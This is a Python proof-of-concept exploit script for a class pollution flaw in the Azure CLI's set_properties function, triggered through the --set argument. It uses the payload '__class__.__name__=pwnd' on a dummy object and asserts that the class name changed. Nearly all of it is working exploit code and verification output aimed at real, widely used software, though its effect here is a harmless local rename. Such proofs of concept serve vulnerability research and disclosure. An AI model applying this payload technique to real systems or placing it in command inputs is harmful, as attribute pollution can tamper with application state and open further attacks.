# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: set_properties
# Type: get-both-set-both
# Trigger: CLI argument --set

# This PoC demonstrates triggering class pollution via az CLI's --set flag
# Example: az resource update --set "__class__.__name__=pwnd"

from azure.cli.core.commands.arm import set_properties

class Target: pass
target = Target()

payload_value = "pwnd"
PAYLOAD = "__class__.__name__=pwnd"

def run_poc():
  set_properties(target, PAYLOAD, "modified")

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local CLI trigger)")

if __name__ == "__main__":
  verify_poc()
